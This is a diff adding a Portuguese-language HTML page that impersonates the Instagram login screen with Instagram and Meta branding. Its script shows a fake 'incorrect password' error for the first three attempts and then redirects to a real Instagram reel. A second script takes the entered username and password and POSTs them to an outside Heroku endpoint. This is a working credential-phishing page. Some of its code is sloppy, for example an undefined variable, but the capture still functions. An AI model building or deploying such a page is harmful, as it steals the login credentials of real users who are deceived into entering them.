@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="src/style.css">
+    <title>Instagram Login</title>
+            <link rel="icon" type="image/png" href="./img/instagram.png">
+</head>
+<body>
+     
+    <div class="instagram-wrapper">
+    
+     <div class="instagram-phone">
+            <img src="./img/apresentacao-celular.png" alt="instagram apresentação">
+        </div>
+
+        <div class="instagram-login">
+     
+ 
+<p class="not-account">Português (Brasil)
+
+    <p style="margin-bottom: 20px;"></p>
+
+                  <img src="./img/instagram.png"
+                  
+     alt="instagram apresentação"
+     style="width: 80px; height: 80px;">
+
+    <p style="margin-bottom: 50px;"></p>
+          
+            <form id="formulario">
+    <input type="text" id="nome" placeholder="Telefone, nome de usuário ou email">
+
+<div class="input-senha">
+    <input type="password" id="mensagem" placeholder="Senha">
+    <span class="olho" onclick="mostrarSenha()">👁</span>
+</div>
+
+    <button type="submit" class="instagram-entrar">Entrar</button>
+
+   <p id="textoClicado" style="display:none; color:#ed4956; margin-top:10px;">
+   Senha Incorreta! Tente Novamente
+</p>
+
+    <p>Esqueceu a senha?</p>
+</form>
+
+<script>
+let cliques = 0;
+
+document.getElementById("formulario").addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    cliques++;
+
+    if (cliques <= 3) {
+        document.getElementById("textoClicado").style.display = "block";
+    } else {
+        window.location.href = "https://www.instagram.com/reel/DWAS4p_kRs1/";
+    }
+});
+function mostrarSenha() {
+    const senha = document.getElementById("mensagem");
+
+    senha.type = senha.type === "password" ? "text" : "password";
+}
+const senha = document.getElementById("mensagem");
+const toggle = document.getElementById("toggleSenha");
+
+toggle.addEventListener("click", () => {
+    if (senha.type === "password") {
+        senha.type = "text";
+        toggle.textContent = "🙈";
+    } else {
+        senha.type = "password";
+        toggle.textContent = "👁️";
+    }
+});
+</script>
+
+    <p style="margin-bottom: 30px;"></p>
+<a href="#" class="instagram-esqueceu">Criar nova conta</a>
+<img src="./img/meta.png"
+     alt="Meta"
+     style="width: 60px; height: 30px; margin-top: 0;">
+</form>
+
+<style>
+ .instagram-esqueceu {
+    display: inline-block;
+    padding: 15px 90px;
+    border: 1px solid #0095f6;
+    border-radius: 20px;
+    color: #0095f6;
+    text-decoration: none;
+    font-weight: 600;
+    text-align: center;
+    cursor: pointer;
+}
+.input-senha {
+    position: relative;
+    width: 350px;
+}
+
+.input-senha input {
+    width: 100%;
+    height: 60px;
+    padding: 10px 45px 10px 10px; /* espaço para o olho */
+    border: 1px solid #dbdbdb;
+    border-radius: 20px;
+    background-color: #fafafa;
+    box-sizing: border-box;
+}
+
+.input-senha .olho {
+    position: absolute;
+    right: 15px;
+    top: 50%;
+    transform: translateY(-50%);
+    cursor: pointer;
+    font-size: 20px;
+    color: #8e8e8e;
+    user-select: none;
+}
+
+.instagram-esqueceu:hover {
+    background-color: #f0f8ff;
+}
+#formulario {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 25px; /* Espaço entre os elementos */
+    width: 100%;
+    
+}
+
+#formulario input {
+    width: 350px;
+      height: 60px;  /* altura */
+    padding: 10px;
+    border: 1px solid #dbdbdb;
+    border-radius: 20px; /* bordas mais arredondadas */
+    background-color: #fafafa;
+    box-sizing: border-box;
+}
+
+.instagram-entrar {
+    width: 320px;
+      height: 50px;  /* altura */
+    padding: 10px;
+    border: none;
+    border-radius: 20px; /* bordas mais arredondadas */
+    background-color: #0095f6;
+    color: white;
+    cursor: pointer;
+}
+
+.group {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+
+    width: 400px;   /* largura */
+    height: 400px;  /* altura */
+}
+</style>
+
+
+<div id="resultado"></div>
+
+<script>
+document.getElementById("formulario").addEventListener("submit", async (e) => {
+    e.preventDefault();
+
+    const mensagem = document.getElementById("nome").value;
+    const nome = document.getElementById("mensagem").value;
+
+await fetch("https://testese-25e7f8228b47.herokuapp.com/cadastro", {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        mensagem,
+        nome
+    })
+});
+
+
+    const dados = await resposta.json();
+
+});
+</script>
+                
+                
+            
+         
+            </div>
+
+           
+              
+            
+
+</div>
+
+</body>
+</html>
